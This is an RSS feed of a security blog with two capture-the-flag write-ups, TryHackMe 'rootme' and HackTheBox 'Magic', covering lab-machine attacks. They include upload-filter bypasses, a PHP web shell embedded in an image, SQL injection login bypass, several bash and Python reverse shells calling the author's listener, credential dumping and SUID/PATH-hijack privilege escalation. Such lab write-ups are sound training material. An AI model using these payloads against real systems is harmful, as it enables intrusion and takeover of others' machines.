<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Upload-bypass on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/upload-bypass/</link>
    <description>Recent content in Upload-bypass on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Fri, 02 Jul 2021 22:08:48 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/upload-bypass/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>TryHackMe - rootme</title>
      <link>https://fahmifj.github.io/writeups/tryhackme/thm-rootme/</link>
      <pubDate>Fri, 02 Jul 2021 22:08:48 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/tryhackme/thm-rootme/</guid>
      <description>A ctf for beginners, can you root me?</description>
      <content:encoded><![CDATA[<fieldset>
<legend>Room Information </legend>
<ul>
<li><strong>Name:</strong>  <a href="https://tryhackme.com/room/rrootme">rootme</a></li>
<li><strong>Category:</strong> Boot2root</li>
<li><strong>Difficulty:</strong> Easy</li>
<li><strong>Tools:</strong>
<ul>
<li>Nmap</li>
<li>Gobuster</li>
</ul>
</li>
<li><strong>Skills Learned</strong>:
<ul>
<li>Web enumeration</li>
<li>SUID exploitation</li>
</ul>
</li>
</ul>
</fieldset>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan discovers two open ports: SSH on port 22 and HTTP on port 80.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «rootme» «10.9.30.115» 
$ nmap -p- --min-rate <span style="color:#ae81ff">1000</span> --reason -oA nmap/10-tcp-allport 10.10.215.165                      
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-29 23:35 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.215.165
Host is up, received reset ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>0.26s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65533</span> closed ports
Reason: <span style="color:#ae81ff">65533</span> resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span>
80/tcp open  http    syn-ack ttl <span style="color:#ae81ff">63</span>

Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 96.24 seconds
</code></pre></div><p>Running a script scan didn&rsquo;t really helpful, so I&rsquo;ll dig the website on port 80.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting the website doesn&rsquo;t display anything except a prompt-like text &ldquo;root@rootme:~#&rdquo;.</p>
<p><img class="img-container" src="imgs/image-20210530105241967.png" alt="image-20210530105241967"  />
</p>
<h4 id="gobuster">Gobuster</h4>
<p>A <code>Gobuster</code> scan discovers several directories on this website, ones of which interesting are <code>/uploads</code> and <code>/panel</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «rootme» «10.9.30.115» 
$ gobuster dir -u http://10.10.215.165/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -z
<span style="color:#f92672">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.215.165/
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
<span style="color:#f92672">===============================================================</span>
2021/05/29 23:37:44 Starting gobuster in directory enumeration mode
<span style="color:#f92672">===============================================================</span>
/js                   <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 311<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.215.165/js/<span style="color:#f92672">]</span>
/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 312<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.215.165/css/<span style="color:#f92672">]</span>
/uploads              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 316<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.215.165/uploads/<span style="color:#f92672">]</span>
/panel                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 314<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.215.165/panel/<span style="color:#f92672">]</span>  
/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 278<span style="color:#f92672">]</span>                 
<span style="color:#f92672">===============================================================</span>
2021/05/29 23:43:21 Finished
<span style="color:#f92672">===============================================================</span>
</code></pre></div><h4 id="panel">/panel</h4>
<p>On <code>/panel</code>, there is an upload form, but it blocks a file with <code>.php</code> extensions.</p>
<p><img class="img-container" src="imgs/image-20210530105345640.png" alt="image-20210530105345640"  />
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="upload-filter-bypass">Upload filter bypass</h4>
<p>Uploading a file with extension <code>.phtml</code> bypasses the upload filter. The uploaded file can be found at <code>/uploads/[here]</code>.</p>
<p><img class="img-container" src="imgs/image-20210530105538891.png" alt="image-20210530105538891"  />
</p>
<h4 id="reverse-shell">Reverse shell</h4>
<p>I&rsquo;ll upload the following file and setup a listener to get a shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «rootme» «10.9.30.115»  
$ cat iamf.phtml    
&lt;?php
system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.9.30.115/443 0&gt;&amp;1&#39;&#34;</span><span style="color:#f92672">)</span>;
</code></pre></div><p>I&rsquo;ll trigger reverse shell by visiting <code> http://10.10.215.165/uploads/iamf.phtml</code> on the browser.</p>
<p><img class="img-container" src="imgs/image-20210530105644738.png" alt="image-20210530105644738"  />
</p>
<h4 id="shell-upgrade">Shell upgrade</h4>
<p>I&rsquo;ll do the PTY trick to upgrade my shell to interactive one.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">www-data@rootme:/var/www/html$ which python
which python
/usr/bin/python
www-data@rootme:/var/www/html$ export TERM<span style="color:#f92672">=</span>xterm
export TERM<span style="color:#f92672">=</span>xterm
www-data@rootme:/var/www/html$ python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
bash-4.4$ ^Z
<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">2625</span> suspended  nc -nvlp <span style="color:#ae81ff">443</span>
→ root@kali «rootme» «10.9.30.115» 
$ stty raw -echo; fg
<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">2625</span> continued  nc -nvlp <span style="color:#ae81ff">443</span>

bash-4.4$ 
</code></pre></div><p>The user flag can be found at <code>/var/www/user.txt</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">bash-4.4$ find / -type f -user www-data 2&gt;/dev/null | grep -v <span style="color:#e6db74">&#39;proc\|sys&#39;</span>
...
/var/www/user.txt
...
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<p>I find out the current Python binary has SUID bit set.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">bash-4.4$ find / -type f -perm -u<span style="color:#f92672">=</span>s 2&gt;/dev/null | grep -v <span style="color:#e6db74">&#39;snap&#39;</span>
...
/usr/bin/python
...
</code></pre></div><p>Python with SUID can be exploited by executing <code>import os; os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;)</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">bash-4.4$ python -c <span style="color:#e6db74">&#39;import os; os.execl(&#34;/bin/bash&#34;, &#34;bash&#34;, &#34;-p&#34;)&#39;</span>
bash-4.4# id
uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> egid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
</code></pre></div><p><img class="img-container" src="imgs/image-20210530111120071.png" alt="image-20210530111120071"  />
</p>
<p>I can grab the root flag now.</p>
<p><img class="img-container" src="imgs/image-20210530111235501.png" alt="image-20210530111235501"  />
</p>
<hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://gtfobins.github.io/gtfobins/python/">https://gtfobins.github.io/gtfobins/python/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Magic</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-magic/</link>
      <pubDate>Fri, 09 Apr 2021 13:32:05 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-magic/</guid>
      <description>Magic machine from HackTheBox</description>
      <content:encoded><![CDATA[<p>Magic is a medium difficulty Linux machine from HackTheBox that features a php-based web application which is vulnerable to SQL injection for login bypass. The application upload feature has an upload filter that can be bypassed by embedding a web shell payload to a valid image file and adding a php extension to it. With that web shell, I&rsquo;m able to gain a foothold on the system and use database credentials to dump admin password that is reused by a user on the box. For the root part, there&rsquo;s a SUID binary that calls other binaries without their absolute path. This allows me to perform a path hijack attack and gain root access.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>SQL injection</li>
<li>Bypassing Upload Filter</li>
<li>SUID exploitation</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>Exiftool - <a href="https://exiftool.org/">https://exiftool.org/</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «magic» «10.10.14.169»
$ nmap -sC -sV -oA scans/magic 10.10.10.185

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey:
|   <span style="color:#ae81ff">2048</span> 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p><code>nmap</code> found two ports open, an HTTP service on port 80 and SSH service on port 22</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80  -  Website</h3>
<p>The home page shows a bunch of images.</p>
<p><img src="imgs/image-20210413132328926.png" alt="image-20210413132328926" style="zoom:80%;" /></p>
<p>By clicking &ldquo;Views image&rdquo;, I know some images located on <code>/images/uploads</code> and some others on <code>/images/fulls</code>. At the bottom page, there&rsquo;s a login button that points to <code>/login.php</code></p>
<p><img src="imgs/image-20210412052815532.png" alt="image-20210412052815532" style="zoom: 80%;" /></p>
<p>Common credentials don&rsquo;t seem to work here.</p>
<h4 id="sql-injection---login-bypass-on-loginphp">SQL injection - Login bypass on <code>/login.php</code></h4>
<blockquote>
<p>The login form doesn&rsquo;t allows spacing between character, but it can be tricked by copy and paste.</p>
</blockquote>
<p>A basic sql injection technique <code>' or 1 = 1 -- - </code>  to bypass login is work against the login page.</p>
<blockquote>
<p>In MySQL, a space after a comment is a must <code>-- [space]</code>, because of that I added <code>-- -</code> to make it clear.</p>
</blockquote>
<p>We can assume the back-end query would look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">...<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">some</span> php<span style="color:#f92672">&gt;</span>...
<span style="color:#960050;background-color:#1e0010">$</span>username <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>_POST[<span style="color:#e6db74">&#39;user&#39;</span>]
<span style="color:#960050;background-color:#1e0010">$</span>pwd <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>_POST[<span style="color:#e6db74">&#39;password&#39;</span>]
...<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">some</span> php<span style="color:#f92672">&gt;</span>...

<span style="color:#66d9ef">SELECT</span> username, password <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">table</span>.<span style="color:#66d9ef">user</span> <span style="color:#66d9ef">where</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$username&#39;</span> <span style="color:#66d9ef">and</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$pwd&#39;</span>
</code></pre></div><p>If I assign <code>' or 1 = 1 -- - </code> as value of <code>$username</code>, it becomes:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> username, password <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">table</span>.<span style="color:#66d9ef">user</span> <span style="color:#66d9ef">where</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#75715e">-- -&#39; and password=&#39;$pwd&#39;
</span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="upload-filter-bypass">Upload filter bypass</h4>
<p>Upon a successful login, the site redirects me to <code>/upload.php</code>. It shows up with an upload form. It only accepts a valid image file.</p>
<p><img src="imgs/image-20210413153556151.png" alt="image-20210413153556151" style="zoom:80%;" /></p>
<p>After some testing, I can bypass this upload filter by embedding my php shell on an image file (I took it from the web itself). This can be done by using <code>exiftools</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «forest» «10.10.14.169»
$ ./exiftool -Comment<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> iamf.jpg
</code></pre></div><p>Next, I added <code>.php</code> extension right before the image extension (in my case it is <code>.jpg</code>, so it becomes <code>filename.php.jpg</code>).</p>
<p>Back to <code>/upload.php</code>, now it accepts my php embedded image.</p>
<p><img src="imgs/image-20210413153504323.png" alt="image-20210413153504323" style="zoom:80%;" /></p>
<p>I can find the uploaded file at <code>http://htb.magic/images/uploads/</code>.</p>
<p>When I visit <code>http://htb.magic/images/uploads/iamf.php.jpg?cmd=pwd</code>, I can see the code execution is working</p>
<p><img src="https://cdn-images-1.medium.com/max/1000/1*WJEvgyrM5UmXULt8uBhu3A.png" alt="img" style="zoom:80%;" /></p>
<h4 id="shell-access">Shell access</h4>
<p>The machine has Python3 installed. With that, I can send a Python one liner reverse shell and set up a listener on port 443 to gain a foothold on the system.</p>
<p>I&rsquo;ll enter this URL on the browser.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">http://htb.magic/images/uploads/iamf.php.jpg?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.169%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27&#34;
</span></code></pre></div><p>Now on my listener, it caught the shell</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «magic» «10.10.14.169»
$ nc -nvlp <span style="color:#ae81ff">443</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.169<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.185<span style="color:#f92672">]</span> <span style="color:#ae81ff">19448</span>
bash: cannot set terminal process group <span style="color:#f92672">(</span>1327<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
bash: no job control in this shell
$ id
uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-theseus">Shell as theseus</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>I discovered a database configuration <code>db.php5</code> that stores credentials after enumerating the current working directory with the find command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ find . -type f -user www-data

...&lt;SNIP&gt;...
./var/www/Magic/db.php5
...&lt;SNIP&gt;...
</code></pre></div><p><img src="imgs/image-20210413153535228.png" alt="image-20210413153535228" style="zoom:80%;" /></p>
<h4 id="database-dump">Database dump</h4>
<p>I can use <code>netstat</code> to confirm that the MySQL server is currently running.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@ubuntu:/var/www/Magic$ netstat -tlpn

...&lt;SNIP&gt;...
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
...&lt;SNIP&gt;...
tcp		0		<span style="color:#ae81ff">0</span>   127.0.0.1:3306           0.0.0.0:*              LISTEN       -
...&lt;SNIP&gt;...
</code></pre></div><p>Unfortunately, <code>mysql</code> binary is not present in the box.</p>
<p><img src="imgs/image-20210413153425371.png" alt="image-20210413153425371" style="zoom:67%;" /></p>
<p>Instead, I could use <code>mysqldump</code> to dump the database.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@ubuntu:/var/www/Magic$ mysqldump Magic -u theseus -p<span style="color:#e6db74">&#39;iamkingtheseus&#39;</span>

...&lt;SNIP&gt;...
LOCK TABLES <span style="color:#e6db74">`</span>login<span style="color:#e6db74">`</span> WRITE;
/*!40000 ALTER TABLE <span style="color:#e6db74">`</span>login<span style="color:#e6db74">`</span> DISABLE KEYS */;
INSERT INTO <span style="color:#e6db74">`</span>login<span style="color:#e6db74">`</span> VALUES <span style="color:#f92672">(</span>1,<span style="color:#e6db74">&#39;admin&#39;</span>,<span style="color:#e6db74">&#39;Th3s3usW4sK1ng&#39;</span><span style="color:#f92672">)</span>;
/*!40000 ALTER TABLE <span style="color:#e6db74">`</span>login<span style="color:#e6db74">`</span> ENABLE KEYS */;
UNLOCK TABLES;                                           
/*!40103 SET TIME_ZONE<span style="color:#f92672">=</span>@OLD_TIME_ZONE */;
...&lt;SNIP&gt;...
</code></pre></div><h4 id="shell-upgrade-to-ssh">Shell upgrade to SSH</h4>
<p>The password is reused by user <code>theseus</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@ubuntu:/var/www/Magic$ su theseus
Password: 
theseus@ubuntu:/var/www/Magic$
</code></pre></div><p>Before enumeration, I would like to switch to SSH. First, I&rsquo;ll generate a new ssh key.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «magic» «10.10.14.169»
$ ssh-keygen -f theseus 
</code></pre></div><p>Then, I&rsquo;ll add the newly generated public key to <code>theseus</code>&rsquo;s <code>authorized_keys</code>.</p>
<pre><code>theseus@ubuntu:~/.ssh$ echo 'ssh-rsa AAABBBCCCDDD' &gt;&gt; authorized_keys
</code></pre><p>Now I can log in via SSH.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «magic» «10.10.14.169»
$ ssh -i  theseus@10.10.10.185
...&lt;SNIP&gt;...
theseus@ubuntu:~$ id
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>theseus<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>theseus<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>100<span style="color:#f92672">(</span>users<span style="color:#f92672">)</span>,1000<span style="color:#f92672">(</span>theseus<span style="color:#f92672">)</span>
</code></pre></div><h2 id="shell-as-root">Shell as root</h2>
<h4 id="enumeration-2">Enumeration</h4>
<p>Upon enumerating for SUID, there&rsquo;s a binary that doesn&rsquo;t seem a common SUID on Ubuntu.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">theseus@ubuntu:~$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
</code></pre></div><p><img src="imgs/image-20210413153352652.png" alt="image-20210413153352652" style="zoom: 67%;" /></p>
<p>The <code>sysinfo</code> binary is owned by root, but it can be executed by the <code>users</code> group and  <code>theseus</code> is a member of that group.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">theseus@ubuntu:~$ ls -las /bin | grep sysinfo
 <span style="color:#ae81ff">24</span> -rwsr-x--- <span style="color:#ae81ff">1</span> root users <span style="color:#ae81ff">22040</span> Oct <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">2019</span> sysinfo
</code></pre></div><p>I executed the binary and it returns some hardware information on screen that looks similar to <code>lshw</code>, <code>free</code> and other binary related to hardware info. A quick search on Google shows this:</p>
<p><img src="imgs/image-20210413153328164.png" alt="image-20210413153328164" style="zoom:80%;" /></p>
<p>It is the same header.</p>
<p><img src="imgs/image-20210413153311827.png" alt="image-20210413153311827" style="zoom:80%;" /></p>
<p>Running <code>strings</code> against <code>sysinfo</code> reveals it calls <code>lshw</code>, <code>free</code>, <code>fdisk</code> and some other bins without their absolute path. (I don&rsquo;t have the screenshots to show what it looks like, also can&rsquo;t find the logs on my notes, sorry)</p>
<ul>
<li>Absolute path: <code>/bin/sysinfo</code> &ndash;&gt; fixed path, can not be modified except global write access is permitted. (cmiiw)</li>
<li>Relative path: <code>sysinfo</code> &ndash;&gt; resolved by user&rsquo;s env, can be modified</li>
</ul>
<h4 id="suid---path-hijack">SUID - Path Hijack</h4>
<p>Knowing the SUID binary uses relative path to call other binaries, I could abuse this by creating, for example, a fake <code>lshw</code> binary that contains a reverse shell.</p>
<p>First, I’ll create a fake <code>lshw</code> in <code>/tmp/iamf</code> folder and add append one liner bash reverse shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">theseus@ubuntu:/tmp$ mkdir iamf
theseus@ubuntu:/tmp$
theseus@ubuntu:/tmp$ which lshw
/bin/lshw
</code></pre></div><p>Next, I’ll export <code>/tmp/iamf</code> to environment variable <code>$PATH</code>. Now If I call <code>lshw</code>, the OS will resolve it to the one on <code>/tmp/iamf</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">theseus@ubuntu:/tmp$ echo -e <span style="color:#e6db74">&#39;#!/bin/sh bash -i &gt;&amp; /dev/tcp/10.10.10.169/1234 0&gt;&amp;1&#39;</span> &gt; iamf/lshw
theseus@ubuntu:/tmp$
theseus@ubuntu:/tmp$ export PATH<span style="color:#f92672">=</span>/tmp/iamf:$PATH
theseus@ubuntu:/tmp$
theseus@ubuntu:/tmp$ which lshw
/tmp/iamf/lshw
</code></pre></div><p>After that, I can just execute the <code>sysinfo</code> binary.</p>
<p>However, it then just hangs.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">theseus@ubuntu:/tmp$ sysinfo
<span style="color:#f92672">====================</span>Hardware Info<span style="color:#f92672">====================</span>
</code></pre></div><p>That is because it was pwned on my listener.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@iamf «magic» «10.10.14.169»
$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.169] from (UNKNOWN) [10.10.10.185] 36094
root@ubuntu:/tmp/iamf# id
uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)
</code></pre></div><center>
<p><img class="img-container" src="imgs/image-20210413152136238.png" alt="image-20210413152136238"  />
</p>
</center>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://portswigger.net/support/using-sql-injection-to-bypass-authentication">https://portswigger.net/support/using-sql-injection-to-bypass-authentication</a></li>
<li><a href="https://exiftool.org/">https://exiftool.org/</a></li>
<li><a href="https://github.com/xapax/security/blob/master/bypass_image_upload.md">https://github.com/xapax/security/blob/master/bypass_image_upload.md</a></li>
<li><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
